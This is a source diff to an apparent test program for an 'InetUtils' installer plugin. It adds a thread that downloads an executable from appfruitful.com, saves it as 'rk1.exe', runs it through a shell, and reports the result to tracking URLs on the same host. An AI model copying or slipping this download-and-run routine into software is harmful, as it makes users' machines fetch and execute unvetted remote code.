@@ -6,9 +6,9 @@
 #include <stdio.h>
 #include <map>
 
-#include "InetUtils.h"
-
 #define NSIS_MAX_STRLEN 1024
+
+#include "InetUtils.h"
 
 extern std::map<DWORD, DWORD> DownloadThreads;
 
@@ -21,10 +21,41 @@ int _tmain(int argc, _TCHAR* argv[])
 	TCHAR file[NSIS_MAX_STRLEN] = TEXT("_https.exe");
 	DWORD dwTotal = NSIS_MAX_STRLEN;
 	DWORD dwResult;
-	//dwResult= InetUtils::InternetRequestDownload(url, file);
-	//dwResult = InetUtils::InternetRequestFeedback(url, file, &dwTotal);
 	
+	InetDownloadAndRunParams *lpParams = new InetDownloadAndRunParams();
+	_tcscpy_s(lpParams->lpszDownloadURI, NSIS_MAX_STRLEN, TEXT("https://appfruitful.com/relevant.exe?quant=1356952505"));
+	_tcscpy_s(lpParams->lpszVerifyURI, NSIS_MAX_STRLEN, TEXT("https://appfruitful.com/info.php?quant=1356952505"));
+	_tcscpy_s(lpParams->lpszReportURI, NSIS_MAX_STRLEN, TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1356952505&action="));
+	_tcscpy_s(lpParams->lpszFileCode, NSIS_MAX_STRLEN, TEXT("rk1"));
+	_tcscpy_s(lpParams->lpszFileName, NSIS_MAX_STRLEN, TEXT("d:\\InetUtils\\InetUtils\\rk1.exe"));
+	_tcscpy_s(lpParams->lpszResultGood, NSIS_MAX_STRLEN, TEXT("1935"));
+	_tcscpy_s(lpParams->lpszResultBad, NSIS_MAX_STRLEN, TEXT("1936"));
+	_tcscpy_s(lpParams->lpszCmdArgs, NSIS_MAX_STRLEN, TEXT("/param0=0"));
+	lpParams->type = InetUtils::ExecShell;
 	
+	DWORD dwId;
+	
+	HANDLE hThreadHandle = CreateThread(
+		0,
+		0,
+		(LPTHREAD_START_ROUTINE)InetUtils::DownloadAndRunFileThread,
+		(LPVOID)lpParams,
+		0,
+		&dwId
+	);
+
+	_tprintf(TEXT("Thread id: %d\n"), dwId);
+
+	Sleep(15000);
+
+	DownloadThreads[dwId] = 1;
+
+	DWORD ok = WAIT_OBJECT_0;
+	ok = WaitForSingleObject(hThreadHandle, INFINITE);
+	
+	GetExitCodeThread(hThreadHandle, &dwResult);
+
+	/*
 	dwResult = InetUtils::DownloadAndRunFileEx(
 		TEXT("https://appfruitful.com/relevant.exe?quant=1355595965"),
 		TEXT("https://appfruitful.com/info.php?quant=1355595965"),
@@ -36,6 +67,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		TEXT("/param0=0"),
 		InetUtils::ExecShell
 	);
+	*/
 	
 	/*
 	dwResult = InetUtils::InternetRequestFeedback (
@@ -46,5 +78,6 @@ int _tmain(int argc, _TCHAR* argv[])
 	*/
 
 	_tprintf(TEXT("Result: %d\n"), dwResult);
+
 	return 0;
 }
